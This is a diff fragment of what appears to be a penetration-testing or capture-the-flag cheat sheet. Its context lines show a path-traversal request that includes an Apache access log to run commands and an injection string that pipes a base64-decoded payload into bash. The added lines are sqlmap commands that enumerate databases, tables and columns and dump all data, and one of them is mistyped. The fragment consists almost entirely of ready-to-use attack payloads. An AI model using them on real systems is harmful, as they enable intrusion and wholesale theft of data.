@@ -49,3 +49,10 @@ http://10.10.62.183/?view=dog/../../../../var/log/apache2/access.log&ext&cmd='co
 ```
 "\";echo <base64 payload> | base64 -d | bash;\""
 ```
+#### sqlmap
+```bash
+sqlmap -r req.txt -p <parametr> --dbs
+sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --tables
+sqlmap -r req.txt -D <database_name> -T <table_name> --columns
+sqlmap -r req.txt-p  -D <database_name> --dump-all
+```
